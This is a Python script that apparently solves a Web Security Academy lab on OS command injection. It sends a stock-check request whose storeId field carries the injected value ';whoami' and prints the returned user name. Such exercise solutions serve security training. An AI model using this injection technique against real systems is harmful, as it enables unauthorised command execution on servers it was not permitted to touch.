#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import gc


#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## Setup Proxies to future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy OS Command Injection: Lab 1'
                                ,description="Description: Inject whoami command and retrieve the current user name"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")

args = parser.parse_args()
url = args.url.rstrip('/')
s = requests.Session()

#####################
#    Functions      #
#####################
def retrieve_username(url,s):
    print("[+] Trying to retrieve the current username")
    product_url = url+"/product/stock"
    data = {
            'productId':1,
            'storeId':';whoami'
            }
    r = s.post(product_url, data=data, verify=False, proxies=proxies)
    if r.text:
        print(f"[+] Successfully retrieved the username\n\t-> Current User: {r.text}")
    else:
        print("[-] Couldn't retrieve the username")
        print("[-] Exiting...")
        gc.collect()
        sys.exit(-1)

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage:\n\t{sys.argv[0]} -u <Lab's URL>")
        print(f"[+] Example:\n\t{sys.argv[0]} -u https://random-code.web-security-academy.net")
        gc.collect()
        sys.exit(-1)
    else:
        retrieve_username(url,s)
    
#####################
#       Init        #
#####################
if __name__ == "__main__":
    main()